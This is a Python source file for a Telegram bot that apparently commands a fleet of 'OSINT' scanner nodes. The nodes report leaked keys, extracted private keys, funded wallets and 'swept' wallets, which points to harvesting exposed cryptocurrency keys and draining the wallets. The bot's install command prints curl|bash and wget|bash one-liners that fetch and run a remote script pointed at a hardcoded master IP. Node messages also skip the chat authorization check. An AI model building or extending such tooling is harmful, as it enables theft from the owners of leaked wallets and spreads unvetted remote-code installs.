"""Master bot — runs on prod VPS, controls all nodes via Telegram."""

from __future__ import annotations

import asyncio
import json
import logging
import os
from datetime import datetime, timezone
from typing import Any

import httpx

from src.modules.node.protocol import (
    CommandType,
    MessageType,
    NodeMessage,
    NodeStatus,
)

logger = logging.getLogger(__name__)


def _master_headers() -> dict[str, str]:
    token = os.environ.get("MASTER_API_TOKEN")
    return {"X-Master-Token": token} if token else {}


class MasterBot:
    """Telegram bot that controls all scanner nodes."""

    def __init__(self, telegram_token: str, allowed_chat_ids: list[str] | None = None):
        self.telegram_token = telegram_token
        self.allowed_chat_ids = [str(c) for c in (allowed_chat_ids or [])]
        self.nodes: dict[str, NodeStatus] = {}
        self._offset = 0
        self._running = False
        self._commands: dict[str, Any] = {}  # pending commands

    async def start(self) -> None:
        """Start the master bot polling loop."""
        self._running = True
        logger.info("Master bot starting")
        await self._send_message("1ai-osint Master Bot started. Send /help for commands.")

        while self._running:
            try:
                await self._poll_updates()
                await asyncio.sleep(1)
            except Exception as exc:
                logger.error("Master bot error: %s", exc)
                await asyncio.sleep(5)

    async def stop(self) -> None:
        """Stop the master bot."""
        self._running = False

    async def _poll_updates(self):
        """Poll Telegram for updates."""
        url = f"https://api.telegram.org/bot{self.telegram_token}/getUpdates"
        async with httpx.AsyncClient(timeout=15) as client:
            resp = await client.get(
                url,
                params={
                    "offset": self._offset,
                    "timeout": 10,
                    "allowed_updates": ["message"],
                },
            )
            if resp.status_code != 200:
                return
            data = resp.json()
            for update in data.get("result", []):
                self._offset = update["update_id"] + 1
                msg = update.get("message", {})
                chat_id = str(msg.get("chat", {}).get("id", ""))
                text = msg.get("text", "")
                if text and chat_id:
                    await self._handle_message(chat_id, text)

    async def _handle_message(self, chat_id: str, text: str):
        """Handle incoming Telegram message."""
        # Check if it's a node message
        if text.startswith("[1ai-node]"):
            try:
                json_text = text.split("\n", 1)[1] if "\n" in text else text
                node_msg = NodeMessage.from_telegram(json_text)
                if node_msg:
                    await self._handle_node_message(node_msg)
                    return
            except Exception:
                pass

        # Check authorization
        if self.allowed_chat_ids and chat_id not in self.allowed_chat_ids:
            await self._send_to(chat_id, "Unauthorized. Add your chat_id to allowed list.")
            return

        # Handle bot commands
        text = text.strip()
        if text.startswith("/"):
            await self._handle_command(chat_id, text)
        elif text.startswith("[1ai-node]"):
            pass  # already handled above

    async def _handle_command(self, chat_id: str, text: str):
        """Handle bot commands."""
        parts = text.split(maxsplit=1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        handlers = {
            "/help": self._cmd_help,
            "/nodes": self._cmd_nodes,
            "/status": self._cmd_status,
            "/start": self._cmd_start,
            "/stop": self._cmd_stop,
            "/restart": self._cmd_restart,
            "/sync": self._cmd_sync,
            "/scan": self._cmd_scan,
            "/pause": self._cmd_pause,
            "/config": self._cmd_config,
            "/deploy": self._cmd_deploy,
            "/stats": self._cmd_stats,
            "/install": self._cmd_install,
        }

        handler = handlers.get(cmd)
        if handler:
            await handler(chat_id, args)
        else:
            await self._send_to(chat_id, f"Unknown command: {cmd}\nSend /help for available commands.")

    async def _handle_node_message(self, msg: NodeMessage):
        """Handle messages from nodes."""
        if msg.msg_type == MessageType.REGISTER:
            self.nodes[msg.node_id] = NodeStatus(
                node_id=msg.node_id,
                hostname=msg.payload.get("hostname", ""),
                ip=msg.payload.get("ip", ""),
                version=msg.payload.get("version", ""),
                role=msg.payload.get("role", "worker"),
            )
            logger.info("Node registered: %s (%s)", msg.node_id, msg.payload.get("hostname"))
            await self._send_message(f"Node registered: {msg.node_id} ({msg.payload.get('hostname')})")

        elif msg.msg_type == MessageType.HEARTBEAT:
            if msg.node_id in self.nodes:
                node = self.nodes[msg.node_id]
                node.scanner_running = msg.payload.get("scanner_running", False)
                node.scan_count = msg.payload.get("scan_count", 0)
                node.uptime_sec = msg.payload.get("uptime_sec", 0)
                node.memory_mb = msg.payload.get("memory_mb", 0)
                node.cpu_percent = msg.payload.get("cpu_percent", 0)
                node.last_scan = datetime.now(timezone.utc).isoformat()

        elif msg.msg_type == MessageType.RESULT:
            # Forward results to all authorized chats
            result = msg.payload
            summary = f"Result from {msg.node_id}:\n"
            if "leaks" in result:
                summary += f"  Leaks: {result['leaks']}\n"
            if "keys" in result:
                summary += f"  Keys: {result['keys']}\n"
            if "funded" in result:
                summary += f"  Funded: {result['funded']}\n"
            await self._send_message(summary)

        elif msg.msg_type == MessageType.ERROR:
            await self._send_message(f"Error from {msg.node_id}: {msg.payload.get('error', 'unknown')}")

    # --- Bot Commands ---

    async def _cmd_help(self, chat_id: str, args: str):
        help_text = """1ai-osint Master Bot Commands:

/nodes — List all connected nodes
/status <node> — Detailed node status
/start <node> — Start scanner on node
/stop <node> — Stop scanner on node
/pause <node> — Pause scanner (graceful)
/restart <node> — Restart scanner on node
/sync <node> — Git pull + restart
/scan <node> — Run single scan cycle
/stats — Global scan statistics
/install — Show install script for new nodes
/config <node> key=value — Update config
/deploy — Deploy to all nodes
/help — Show this help"""
        await self._send_to(chat_id, help_text)

    async def _cmd_pause(self, chat_id: str, args: str):
        node_id = args.strip()
        if not node_id:
            await self._send_to(chat_id, "Usage: /pause <node_id>")
            return
        await self._send_command_to_node(node_id, CommandType.STOP, {"graceful": True}, chat_id)

    async def _cmd_stats(self, chat_id: str, args: str):
        """Show global stats from master API."""
        try:
            async with httpx.AsyncClient(timeout=5) as client:
                resp = await client.get("http://localhost:8420/api/stats", headers=_master_headers())
                if resp.status_code == 200:
                    data = resp.json()
                    text = f"""Global Stats:
Seen Keys: {data.get("seen_keys", 0)}
Raw Leaks: {data.get("raw_leaks", 0)}
Extracted Keys: {data.get("extracted_keys", 0)}
Funded Wallets: {data.get("funded_wallets", 0)}
Swept Wallets: {data.get("swept_wallets", 0)}
Active Nodes: {data.get("active_nodes", 0)}"""
                    await self._send_to(chat_id, text)
                else:
                    await self._send_to(chat_id, "Failed to fetch stats from API.")
        except Exception as exc:
            await self._send_to(chat_id, f"Error: {exc}")

    async def _cmd_install(self, chat_id: str, args: str):
        """Show install script for new nodes."""
        master_url = "http://5.189.138.144:8420"
        text = f"""Install a new node:

curl -sSL https://raw.githubusercontent.com/oyi77/1ai-osint/main/scripts/install-node.sh | bash -s -- --master {master_url} --id my-node

Or with wget:
wget -qO- https://raw.githubusercontent.com/oyi77/1ai-osint/main/scripts/install-node.sh | bash -s -- --master {master_url} --id my-node

Options:
  --master {master_url}  Master API URL
  --id my-node           Node ID (auto-unique if duplicate)
  --dir ~/1ai-osint      Install directory

After install, the node auto-registers with master and starts scanning."""
        await self._send_to(chat_id, text)

    async def _cmd_nodes(self, chat_id: str, args: str):
        if not self.nodes:
            await self._send_to(chat_id, "No nodes connected.")
            return

        lines = ["Connected nodes:"]
        for node_id, node in self.nodes.items():
            status = "🟢" if node.scanner_running else "⚪"
            uptime = self._format_uptime(node.uptime_sec)
            lines.append(f"  {status} {node_id} — {node.hostname} ({node.ip})")
            lines.append(f"     Scans: {node.scan_count} | Uptime: {uptime}")
            lines.append(f"     Mem: {node.memory_mb:.0f}MB | CPU: {node.cpu_percent:.1f}%")
        await self._send_to(chat_id, "\n".join(lines))

    async def _cmd_status(self, chat_id: str, args: str):
        node_id = args.strip()
        if not node_id:
            await self._send_to(chat_id, "Usage: /status <node_id>")
            return
        node = self.nodes.get(node_id)
        if not node:
            await self._send_to(chat_id, f"Node '{node_id}' not found.")
            return
        await self._send_to(chat_id, json.dumps(node.to_dict(), indent=2))

    async def _cmd_start(self, chat_id: str, args: str):
        node_id = args.strip()
        if not node_id:
            await self._send_to(chat_id, "Usage: /start <node_id>")
            return
        await self._send_command_to_node(node_id, CommandType.START, {}, chat_id)

    async def _cmd_stop(self, chat_id: str, args: str):
        node_id = args.strip()
        if not node_id:
            await self._send_to(chat_id, "Usage: /stop <node_id>")
            return
        await self._send_command_to_node(node_id, CommandType.STOP, {}, chat_id)

    async def _cmd_restart(self, chat_id: str, args: str):
        node_id = args.strip()
        if not node_id:
            await self._send_to(chat_id, "Usage: /restart <node_id>")
            return
        await self._send_command_to_node(node_id, CommandType.RESTART, {}, chat_id)

    async def _cmd_sync(self, chat_id: str, args: str):
        node_id = args.strip()
        if not node_id:
            await self._send_to(chat_id, "Usage: /sync <node_id>")
            return
        await self._send_command_to_node(node_id, CommandType.SYNC, {}, chat_id)

    async def _cmd_scan(self, chat_id: str, args: str):
        node_id = args.strip()
        if not node_id:
            await self._send_to(chat_id, "Usage: /scan <node_id>")
            return
        await self._send_command_to_node(node_id, CommandType.SCAN_ONCE, {}, chat_id)

    async def _cmd_config(self, chat_id: str, args: str):
        parts = args.split(maxsplit=1)
        if len(parts) < 2 or "=" not in parts[1]:
            await self._send_to(chat_id, "Usage: /config <node_id> key=value")
            return
        node_id = parts[0]
        key, value = parts[1].split("=", 1)
        await self._send_command_to_node(
            node_id,
            CommandType.CONFIG,
            {"key": key.strip(), "value": value.strip()},
            chat_id,
        )

    async def _cmd_deploy(self, chat_id: str, args: str):
        """Deploy to all nodes."""
        if not self.nodes:
            await self._send_to(chat_id, "No nodes connected.")
            return
        await self._send_to(chat_id, f"Deploying to {len(self.nodes)} nodes...")
        for node_id in self.nodes:
            await self._send_command_to_node(node_id, CommandType.SYNC, {}, chat_id)

    # --- Helpers ---

    async def _send_command_to_node(self, node_id: str, command: CommandType, payload: dict, chat_id: str):
        """Send command to a node via HTTP API command queue."""
        if node_id not in self.nodes:
            await self._send_to(chat_id, f"Node '{node_id}' not found.")
            return

        try:
            async with httpx.AsyncClient(timeout=5) as client:
                resp = await client.post(
                    "http://localhost:8420/api/commands",
                    json={
                        "node_id": node_id,
                        "command": command.value,
                        "payload": payload,
                    },
                    headers=_master_headers(),
                )
                if resp.status_code == 200:
                    await self._send_to(chat_id, f"Command '{command.value}' queued for {node_id}")
                else:
                    await self._send_to(chat_id, f"Failed to queue command: {resp.text}")
        except Exception as exc:
            await self._send_to(chat_id, f"Error: {exc}")

    async def _send_message(self, text: str):
        """Send message to all authorized chats."""
        for chat_id in self.allowed_chat_ids:
            await self._send_to(chat_id, text)

    async def _send_to(self, chat_id: str, text: str):
        """Send message to a specific chat."""
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            async with httpx.AsyncClient(timeout=10) as client:
                await client.post(
                    url,
                    json={
                        "chat_id": chat_id,
                        "text": text,
                    },
                )
        except Exception as exc:
            logger.debug("Failed to send to %s: %s", chat_id, exc)

    @staticmethod
    def _format_uptime(seconds: float) -> str:
        if seconds < 60:
            return f"{seconds:.0f}s"
        elif seconds < 3600:
            return f"{seconds / 60:.0f}m"
        elif seconds < 86400:
            return f"{seconds / 3600:.1f}h"
        else:
            return f"{seconds / 86400:.1f}d"
